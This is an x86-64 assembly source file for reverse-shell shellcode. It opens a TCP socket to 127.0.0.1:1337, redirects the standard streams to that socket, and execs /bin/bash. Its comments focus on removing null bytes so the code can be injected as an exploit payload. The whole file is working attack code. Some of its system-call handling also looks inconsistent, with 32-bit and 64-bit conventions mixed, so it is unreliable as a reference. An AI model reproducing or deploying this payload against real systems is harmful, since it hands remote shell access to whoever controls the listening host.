section .text
global _start

_start:
_socket:
    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
    xor rbx, rbx ; clear rbx, this results in no 0 bytes in the shellcode
    xor rcx, rcx ; clear rcx, this results in no 0 bytes in the shellcode
    xor rdx, rdx ; clear rdx, this results in no 0 bytes in the shellcode
    ; we use the bl,cl,dl registers instead of rbx rcx rdx registers because
    ; they result in extra 0 bytes in the shell code
    mov bl, 2 ; AF_INET
    mov cl, 1 ; SOCK_STREAM
    mov dl, 6 ; IPPROTO_TCP
    mov ax, 359; sys_socket
    int 0x80 ; syscall
    mov r13, rax ; save file descriptor

_connect:
    mov rax, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
    push rax

    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
    mov al, 42 ; connect
    mov rdi, r13
    mov rsi, rsp
    mov dl, 0x10
    syscall

_dup2:
    xor rcx, rcx ; stdout, set 0 to rcx without using mov rcx, 0 -> which results in 0 bytes in the shellcode
    mov rbx, r13
    mov al, 63 ; dup2
    int 0x80

    cmp cl, 3 ; did we reach stderr yet?
    jz short 0x5 ; if so jump past next instructions, found jmp numbers by inspecting where it wants to jump in objdump -d
    inc cl ; increment cl so that it becomes, 1 (stdin) -> 2 (stderr)
    jmp short -12 ; jump back to dup2, found jmp numbers by inspecting where it wants to jump in objdump -d

    ; prepare execing bin/bash
    mov al, `h` ; we use al here, becaue we don't want to padd with 0 bytes
    push ax ; we push ax here because we want to add a zero byte after /bin/bash on the stack
    mov rax, `/bin/bas`
    push rax

    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
    mov al, 59 ; execve, use al, this results in no 0 bytes in the shellcode
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

_exit:
    mov rax, 1
    mov rbx, 0
    int 0x80